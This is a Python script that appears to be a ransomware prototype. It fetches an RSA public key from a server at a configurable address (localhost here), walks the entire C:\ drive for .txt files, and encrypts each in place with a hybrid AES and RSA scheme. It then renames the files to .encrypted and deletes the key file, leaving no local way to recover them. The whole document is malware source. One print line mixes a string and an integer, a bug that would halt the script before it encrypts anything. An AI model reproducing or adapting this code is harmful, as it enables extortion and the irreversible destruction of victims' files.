import os
import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher    import PKCS1_OAEP, AES
from Crypto.Random    import get_random_bytes



########## GLOBAL ##########
IP_ADDRESS = "127.0.0.1"
PORT       = 12301
############################



def get_public_key():
    print("creating socket...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print("connecting to server...")
        s.connect((IP_ADDRESS, PORT))

        print("retrieving public_key.pem...")
        s.send("request: public_key".encode())
        public_key = s.recv(2048)

        with open("public_key.pem", "wb") as public_key_file:
            public_key_file.write(public_key)
        s.close()

    print("done retrieving: public_key.pem")
    print("\n")



def get_file_list():
    file_list = []
    for root, _, files in os.walk("C:\\"):
        for file in files:
            _, file_extension = os.path.splitext(root+"\\"+file)
            if file_extension == ".txt":
                file_list.append(root+"\\"+file)
    print("done fetching: file_list")
    print("\n")
    return file_list



def encrypt(file, public_key_file):
    try:
        with open(file, "rb") as f:
            data = f.read()

        with open(public_key_file, "rb") as pkf:
            key = RSA.import_key(pkf.read())

        session_key = get_random_bytes(16)

        cipher                = PKCS1_OAEP.new(key)
        encrypted_session_key = cipher.encrypt(session_key)

        cipher                = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag       = cipher.encrypt_and_digest(data)

        with open(file, "wb") as f:
            [ f.write(x) for x in (encrypted_session_key, cipher.nonce, tag, ciphertext) ]

        file_name, _ = os.path.splitext(file)
        os.rename(file, file_name + ".encrypted")

        print("done encrypting:" + file)
        print("\n")
        
    except:
        pass



def main():
    get_public_key()
    print("\n")
    file_list = get_file_list()
    print("#files: " + len(file_list))
    for file in file_list:
        encrypt(file, "public_key.pem")
    os.remove("public_key.pem")



main()